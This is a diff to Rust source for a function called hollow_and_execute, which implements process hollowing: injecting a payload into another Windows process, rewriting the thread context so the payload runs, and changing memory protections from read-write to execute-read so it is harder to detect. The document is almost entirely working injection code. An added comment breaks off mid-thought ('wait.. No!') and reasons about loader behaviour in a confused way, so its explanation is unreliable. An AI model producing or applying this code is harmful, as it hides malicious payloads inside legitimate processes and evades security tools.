@@ -791,7 +791,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                             std::ptr::null_mut(),
                             stub.len(),
                             MEM_COMMIT | MEM_RESERVE,
-                            PAGE_EXECUTE_READWRITE,
+                            PAGE_READWRITE,
                         )
                     };
                     if !stub_mem.is_null() {
@@ -806,6 +806,16 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                             )
                         } != 0
                         {
+                            let mut old_protect = 0;
+                            unsafe {
+                                VirtualProtectEx(
+                                    pi.hProcess,
+                                    stub_mem,
+                                    stub.len(),
+                                    PAGE_EXECUTE_READ,
+                                    &mut old_protect,
+                                );
+                            }
                             entry_point = stub_mem as usize;
                         }
                     }
@@ -822,65 +832,24 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
             std::io::Error::last_os_error()
         ));
     }
-    // On x64, set Rip directly to the payload entry point so the resumed thread
-    // starts executing the new image immediately.  We also leave Rcx pointing at
-    // the entry point for compatibility with any callee that follows the
-    // RtlUserThreadStart convention (which receives the start address in rcx).
-    // Setting Rcx alone (without Rip) was unsafe because the original Rip in
-    // ntdll!RtlUserThreadStart depends on the freshly-mapped image still being
-    // present — we have just unmapped that image, so the original code path
-    // would dereference unmapped pointers in `LdrInitializeThunk`.
+    // We leave Rip pointing at the initial entry point (ntdll!RtlUserThreadStart).
+    // RtlUserThreadStart calls LdrInitializeThunk, which handles process/thread
+    // OS initialization (TLS slots, heap initialization, structured exception
+    // handling vectors), which is required before the C runtime can boot natively.
+    // By updating Rcx (or Eax) to point to the payload's entry point, wait.. No!
+    // We already updated PEB.ImageBaseAddress, so LdrInitializeThunk will just 
+    // natively call the AddressOfEntryPoint from the PE headers we wrote into the process.
+    // However, LdrInitializeThunk will subsequently jump to the address specified in
+    // Rcx/Eax (the lpStartAddress given to RtlUserThreadStart). So we must update that
+    // register to our new entry point so execution naturally flows there, ensuring
+    // that the CRT has full OS context during execution.
     #[cfg(target_arch = "x86_64")]
     {
-        let orig_ep = ctx.Rcx as *mut c_void;
-        unsafe {
-            VirtualAllocEx(
-                pi.hProcess,
-                orig_ep,
-                0x1000,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            );
-            let mut jmp_stub: [u8; 12] = [
-                0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, <entry_point>
-                0xFF, 0xE0, // jmp rax
-            ];
-            jmp_stub[2..10].copy_from_slice(&(entry_point as u64).to_le_bytes());
-            let mut written = 0;
-            WriteProcessMemory(
-                pi.hProcess,
-                orig_ep,
-                jmp_stub.as_ptr() as *const _,
-                jmp_stub.len(),
-                &mut written,
-            );
-        }
+        ctx.Rcx = entry_point as u64;
     }
     #[cfg(target_arch = "x86")]
     {
-        let orig_ep = ctx.Eax as *mut c_void;
-        unsafe {
-            VirtualAllocEx(
-                pi.hProcess,
-                orig_ep,
-                0x1000,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            );
-            let mut jmp_stub: [u8; 5] = [0xE9, 0, 0, 0, 0]; // jmp rel32
-            let rel32 = (entry_point as u32)
-                .wrapping_sub(orig_ep as u32)
-                .wrapping_sub(5);
-            jmp_stub[1..5].copy_from_slice(&rel32.to_le_bytes());
-            let mut written = 0;
-            WriteProcessMemory(
-                pi.hProcess,
-                orig_ep,
-                jmp_stub.as_ptr() as *const _,
-                jmp_stub.len(),
-                &mut written,
-            );
-        }
+        ctx.Eax = entry_point as u32;
     }
     if unsafe { SetThreadContext(pi.hThread, &ctx) } == 0 {
         return Err(anyhow!(
